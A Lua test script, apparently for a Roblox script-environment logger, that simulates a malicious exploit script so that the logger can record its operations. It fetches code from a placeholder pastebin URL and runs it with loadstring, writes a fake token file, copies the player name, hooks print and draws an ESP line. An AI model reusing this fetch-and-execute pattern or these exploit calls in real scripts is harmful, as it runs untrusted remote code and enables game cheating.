-- Test script to demonstrate the Ultimate Environment Logger
-- This simulates a malicious script that tries various operations

print("Starting malicious script simulation...")

-- Try to create GUI
local screenGui = Instance.new("ScreenGui")
screenGui.Name = "HackGUI"
screenGui.Parent = game:GetService("CoreGui")

local frame = Instance.new("Frame", screenGui)
frame.Size = UDim2.new(0.3, 0, 0.4, 0)
frame.Position = UDim2.new(0.35, 0, 0.3, 0)
frame.BackgroundColor3 = Color3.fromRGB(50, 50, 50)

-- Try to make HTTP request
local scriptCode = game:HttpGet("https://pastebin.com/raw/malicious")

-- Try to load code
loadstring(scriptCode)()

-- Try to write configuration
writefile("config.json", '{"username":"victim","token":"abc123"}')

-- Try to steal data
local player = game:GetService("Players").LocalPlayer
setclipboard(player.Name)

-- Try to use exploit functions
hookfunction(print, function(...) warn("Hooked!") end)

-- Try Drawing (ESP)
local esp = Drawing.new("Line")
esp.From = Vector3.new(0, 0, 0)
esp.To = Vector3.new(100, 100, 0)
esp.Color = Color3.fromRGB(255, 0, 0)
esp.Thickness = 2
esp.Visible = true

print("Malicious script complete - all operations logged!")
